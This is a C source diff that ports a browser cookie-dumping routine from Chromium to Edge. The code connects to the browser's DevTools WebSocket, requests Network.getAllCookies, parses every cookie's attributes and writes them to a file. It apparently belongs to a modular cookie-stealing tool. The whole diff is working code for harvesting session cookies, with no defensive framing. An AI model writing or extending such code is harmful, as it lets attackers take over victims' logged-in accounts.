@@ -1,5 +1,6 @@
-#include "dlls/chromium/websocket.h"
 #include "shared/cookies.h"
+#include "dlls/edge/edge.h"
+#include "dlls/chromium/websocket.h"
 
 #include <windows.h>
 #include <winhttp.h>
@@ -85,10 +86,10 @@ static char *get_cookie(cookie_t *cookie, char *start_original) {
         { "secure",        &cookie->secure, TYPE_BOOL, true },
         { "session",       &cookie->session, TYPE_BOOL, true },
         { "sameSite",      &cookie->same_site, TYPE_ENUM_SAMESITE, false },
-        { "priority",      &cookie->browser.chromium.priority, TYPE_INT, true },
-        { "sameParty",     &cookie->browser.chromium.same_party, TYPE_BOOL, false },
+        { "priority",      &cookie->browser.edge.priority, TYPE_INT, true },
+        { "sameParty",     &cookie->browser.edge.same_party, TYPE_BOOL, false },
         { "sourceScheme",  &cookie->source_scheme, TYPE_ENUM_SCHEME, true },
-        { "sourcePort",    &cookie->browser.chromium.source_port, TYPE_INT, true },
+        { "sourcePort",    &cookie->browser.edge.source_port, TYPE_INT, true },
     };
 
     const char *object_start = strstr(start_original, "{\"name");
@@ -141,7 +142,7 @@ void fetch_cookies(const char *ws_url, const FILE *outfile) {
 
     printf("Connecting to WebSocket: %s\n", ws_url);
 
-    HINTERNET ws = connect_websocket(ws_url);
+    HINTERNET ws = connect_websocket_ptr ? connect_websocket_ptr(ws_url) : NULL;
     if (!ws) {
         printf("[ERROR] WebSocket connection failed\n");
         return;
@@ -156,7 +157,7 @@ void fetch_cookies(const char *ws_url, const FILE *outfile) {
         msg_id);
 
     printf("Sending Network.getAllCookies (id=%d)\n", msg_id);
-    ws_send(ws, msg);
+    if (ws_send_ptr) ws_send_ptr(ws, msg);
 
     printf("Waiting for cookies response...\n");
     
@@ -167,7 +168,7 @@ void fetch_cookies(const char *ws_url, const FILE *outfile) {
     char *resp;
     while (1) {
         bool last_frame;
-        if (!ws_recv(ws, &resp, &last_frame)) {
+        if (!ws_recv_ptr || !ws_recv_ptr(ws, &resp, &last_frame)) {
             printf("[ERROR] ws_recv failed\n");
             break;
         }
@@ -189,7 +190,7 @@ void fetch_cookies(const char *ws_url, const FILE *outfile) {
         }
         while (true) {
             cookie_t cookie = {0};
-            cookie.browser_type = BROWSER_CHROMIUM;
+            cookie.browser_type = BROWSER_EDGE;
             tmp = get_cookie(&cookie, start);
             if (!tmp) {
                 break;
@@ -211,7 +212,7 @@ void fetch_cookies(const char *ws_url, const FILE *outfile) {
     printf("Cookies gathered successfully\n");
     printf("Closing WebSocket\n");
 
-    close_websocket(ws);
+    if (close_websocket_ptr) close_websocket_ptr(ws);
 
     printf("WebSocket closed\n");
 }
